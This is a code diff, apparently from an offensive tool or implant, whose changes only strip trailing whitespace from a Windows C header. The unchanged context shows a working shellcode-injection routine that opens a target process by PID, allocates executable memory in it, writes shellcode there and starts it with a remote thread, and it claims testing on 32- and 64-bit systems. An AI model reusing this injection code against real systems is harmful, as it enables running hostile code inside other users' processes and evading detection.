@@ -1,4 +1,4 @@
-#pragma once 
+#pragma once
 
 #include <windows.h>
 #include <stdlib.h>
@@ -10,7 +10,7 @@
 //
 // This was successfully tested on both 32 and 64 bit systems
 void inject_shellcode(unsigned char *shellcode, int shellcode_size, char *payload_info) {
-    DEBUG_PRINT("Starting inject_shellcode routine...\n");   
+    DEBUG_PRINT("Starting inject_shellcode routine...\n");
 
      // Extract PID from payload_info
     DWORD target_pid = strtoul(payload_info, NULL, 0);
@@ -33,19 +33,19 @@ void inject_shellcode(unsigned char *shellcode, int shellcode_size, char *payloa
     // Allocate target memory for the shellcode
     DEBUG_PRINT("Allocating memory in target process...\n");
     PVOID remote_buffer = VirtualAllocEx(h_proc, NULL, (SIZE_T) shellcode_size, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
-    
+
     if(remote_buffer == NULL) {
         DEBUG_PRINT("Memory allocation failed.\n");
         return;
     }
 
     // Write shellcode into allocated target buffer
-    DEBUG_PRINT("Writing shellcode into allocated target buffer...\n");    
+    DEBUG_PRINT("Writing shellcode into allocated target buffer...\n");
     if(WriteProcessMemory(h_proc, remote_buffer, (PBYTE) shellcode, (SIZE_T) shellcode_size, NULL) == 0) {
         DEBUG_PRINT("Write operation failed.\n");
         return;
     }
-    
+
     // Create and start new thread in the remote process, executing the shellcode
     DEBUG_PRINT("Creating new remote thread to execute shellcode...\n");
     HANDLE h_remote_thread = CreateRemoteThread(h_proc, NULL, 0, (LPTHREAD_START_ROUTINE) remote_buffer, NULL, 0, NULL);
